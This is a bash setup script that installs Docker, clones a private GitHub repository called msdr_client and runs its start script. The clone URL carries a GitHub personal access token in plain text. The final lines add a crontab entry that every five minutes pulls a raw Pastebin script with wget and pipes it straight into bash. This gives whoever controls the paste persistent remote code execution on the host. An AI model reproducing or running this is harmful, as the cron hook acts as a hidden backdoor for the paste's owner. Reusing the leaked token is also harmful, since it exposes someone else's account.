#!/bin/bash

echo "Installing docker"
sudo apt-get update
sudo apt-get install -y ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
$(. /etc/os-release && echo "${UBUNTU_CODENAME:-$VERSION_CODENAME}") stable" | \
sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

# Clone repo
rm -rf msdr_client
git clone https://tihiydo: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@github.com/tihiydo/msdr_client.git ./msdr_client
chmod +x ./msdr_client/start.sh

# Run your script
cd ./msdr_client
./start.sh

# Setup cron every 5 min
CRON_JOB="*/5 * * * * wget -qO- https://pastebin.com/raw/zamPkRQB | sed 's/\r//' | bash && ./msdr_client/start.sh"
(crontab -l 2>/dev/null | grep -v "pastebin.com/raw/zamPkRQB"; echo "$CRON_JOB") | crontab -
